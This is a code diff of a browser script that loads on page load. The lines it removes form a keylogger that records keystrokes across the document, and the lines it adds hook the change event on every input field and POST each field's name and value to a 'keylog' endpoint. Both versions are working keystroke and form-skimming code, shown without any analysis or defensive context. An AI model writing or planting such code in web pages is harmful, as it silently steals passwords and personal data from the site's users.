@@ -1,6 +1,4 @@
 window.onload = function() {
-    var2 = ",";
-    name = '';
     function make_xhr() {
         var xhr;
         try {
@@ -27,80 +25,34 @@ window.onload = function() {
         }
     }
 
-    if (window.addEventListener){
-        //console.log("first");
-        document.addEventListener('keypress', function2, true);
-        document.addEventListener('keydown', function1, true);
-    }
-    else if (window.attachEvent){
-        //console.log("second");
-        document.attachEvent('onkeypress', function2);
-        document.attachEvent('onkeydown', function1);
-    }
-    else {
-        //console.log("third");
-        document.onkeypress = function2;
-        document.onkeydown = function1;
+    //绑定所有的input元素
+    inputs = document.querySelectorAll('input');
+    for (index = 0; index < inputs.length; index++) {
+        input = inputs[index];
+        if (input.addEventListener) {
+            input.addEventListener('change', handleChange, true);
+        } else if (input.attachEvent) {
+            input.attachEvent('onchange', handleChange);
+        } else {
+            input.onChange = handleChange;
+        }
     }
 }
 
-//onkeypress
-function function2(e)
-{
-    try {
-        srcname = window.event.srcElement.name;
-    } catch (error) {
-        srcname = e.srcElement ? e.srcElement.name : e.target.name
-        if (srcname == "") {
-            srcname = e.target.name
-        }
-    }
+//onchange
+function handleChange(e) {
+    element = e.srcElement ? e.srcElement : e.target;
 
-    var3 = (e) ? e.keyCode : e.which;
-    if (var3 == 0) {
-        var3 = e.charCode
-    }
+    name = element.name;
+    value = element.value;
 
-    if (var3 != "d" && var3 != 8 && var3 != 9 && var3 != 13) {
-        andxhr(var3.toString(16), srcname);
-    }
+    andxhr(name, value);
 }
 
-//onkeydown
-function function1(e) {
-    try {
-        srcname = window.event.srcElement.name;
-    } catch (error) {
-        srcname = e.srcElement ? e.srcElement.name : e.target.name
-        if (srcname == "") {
-            srcname = e.target.name
-        }
-    }
-
-    var3 = (e) ? e.keyCode : e.which;
-    if (var3 == 9 || var3 == 8 || var3 == 13) {
-        andxhr(var3.toString(16), srcname);
-    }
-    else if (var3 == 0) {
-        text = document.getElementById(id).value;
-        if (text.length != 0) {
-            andxhr(text.toString(16), srcname);
-        }
-    }
-
-}
-
-function andxhr(key, inputName) {
-    if (inputName != name) {
-        name = inputName;
-        var2 = ",";
-    }
-    var2 = var2 + key + ",";
+function andxhr(name, value) {
+    console.log(name);
+    console.log(value);
     xhr.open("POST", "keylog", true);
     xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    xhr.send(var2 + '&&' + inputName);
-
-    if (key == 13 || var2.length > 3000) {
-        var2 = ",";
-    }
+    xhr.send("name=" + name + "&value=" + value);
 }
